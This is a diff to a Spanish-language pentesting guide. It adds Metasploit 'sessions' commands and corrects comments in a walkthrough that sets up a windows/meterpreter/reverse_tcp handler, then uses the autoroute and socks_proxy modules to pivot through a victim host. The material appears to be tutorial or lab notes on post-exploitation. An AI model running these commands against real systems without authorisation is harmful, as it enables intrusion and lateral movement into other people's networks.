@@ -55,6 +55,14 @@ set payload windows/meterpreter/reverse_tcp
 exploit
 
 #Esto nos dará el comando a ejecutar en el host victima para conectarnos
+
+sessions
+
+#Con este comando vemos las sesiones actuales
+
+sessions x
+
+#Con este comando nos conectamos a una sesion
 ```
 
 **Después del ejemplo 1 de powershell empire**:
@@ -62,7 +70,6 @@ exploit
 Parece que tras la ejecución del payload generado por metasploit tenemos una sesión de meterpreter, a partir de aquí hay varios comandos que podemos utilizar.
 
 ```cmd
-
 sysinfo
 
 #nos proporciona información del sistema
@@ -75,11 +82,12 @@ search autoroute
 set SESSION 1
 run
 
-#Esto nos permite ejecutar un escaner de puertos en el host victima (en la sesión que tenemos creada).
+#Esto nos permite crear una ruta con el host victima (en la sesión que tenemos creada).
 
 use auxiliary/server/socks_proxy
 set SRVHOST ip #nuestra
 run
 
 #Este modulo nos permite vincular nuestro navegador al suyo y hay que cambiar el proxy en el navegador y poner nuestra ip y el puerto vinculado al del modulo y ya simplemente con poner el dominio o ip victima deberíamos ver el puerto 8080 de ese servidor
+```
 
